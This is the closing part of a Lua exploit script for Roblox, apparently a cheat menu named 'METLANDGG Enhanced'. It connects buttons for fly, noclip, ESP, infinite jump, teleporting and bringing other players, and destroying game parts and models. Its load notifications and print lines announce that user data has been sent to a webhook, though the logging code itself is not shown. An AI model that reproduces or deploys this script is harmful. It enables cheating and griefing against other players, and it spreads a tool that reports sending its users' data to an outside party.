minBtn.MouseButton1Click:Connect(toggleMinimize)
flyBtn.MouseButton1Click:Connect(toggleFly)
speedBtn.MouseButton1Click:Connect(setSpeed)
jumpBtn.MouseButton1Click:Connect(setJump)
infJumpBtn.MouseButton1Click:Connect(toggleInfJump)
noclipBtn.MouseButton1Click:Connect(toggleNoclip)
antiVoidBtn.MouseButton1Click:Connect(toggleAntiVoid)
platformBtn.MouseButton1Click:Connect(togglePlatform)
tpBtn.MouseButton1Click:Connect(tpToPlayer)
bringBtn.MouseButton1Click:Connect(bringPlayer)
autoCheckpointBtn.MouseButton1Click:Connect(toggleAutoCheckpoint)
espBtn.MouseButton1Click:Connect(toggleESP)
fbBtn.MouseButton1Click:Connect(toggleFullbright)

-- Connect destroyer buttons
destroyBtn.MouseButton1Click:Connect(destroyPartsInRange)
destroyAllBtn.MouseButton1Click:Connect(destroyAllParts)
deleteModelBtn.MouseButton1Click:Connect(deleteModel)

-- Close button
closeBtn.MouseButton1Click:Connect(function()
    settings.flyEnabled = false
    if flyConnection then flyConnection:Disconnect() end
    if flyBV then flyBV:Destroy() end
    if flyBG then flyBG:Destroy() end
    if noclipConnection then noclipConnection:Disconnect() end
    if antiVoidConnection then antiVoidConnection:Disconnect() end
    if platformConnection then platformConnection:Disconnect() end
    if platform then platform:Destroy() end
    if infJumpConnection then infJumpConnection:Disconnect() end
    if autoCheckpointConnection then autoCheckpointConnection:Disconnect() end
    removeESP()
    gui:Destroy()
    updateStatus("Closed", Color3.fromRGB(255, 100, 100))
end)

-- Character respawn handler
plr.CharacterAdded:Connect(function(newChar)
    task.wait(1)
    char = newChar
    hum = char:WaitForChild("Humanoid")
    root = char:WaitForChild("HumanoidRootPart")
    
    -- Reset states
    settings.flyEnabled = false
    settings.noclipEnabled = false
    settings.platformEnabled = false
    settings.autoCheckpointEnabled = false
    
    if flyConnection then flyConnection:Disconnect() end
    if noclipConnection then noclipConnection:Disconnect() end
    if platformConnection then platformConnection:Disconnect() end
    if autoCheckpointConnection then autoCheckpointConnection:Disconnect() end
end)

-- Keybind to toggle GUI (Right Shift)
UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        toggleMinimize()
    end
end)

-- Notification
pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "⚡ METLANDGG Enhanced";
        Text = "Loaded! Data sent to webhook 📡";
        Duration = 6;
    })
end)

updateStatus("Enhanced testing suite ready! Data logged 📡", Color3.fromRGB(0, 255, 255))
print("✅ METLANDGG ENHANCED LOADED")
print("📡 Webhook logger active - User data sent!")
print("📌 Features: Minimize (RightShift), Bring Player, Auto Checkpoint")
print("⚠️ WARNING: Destroy functions are for testing only!")
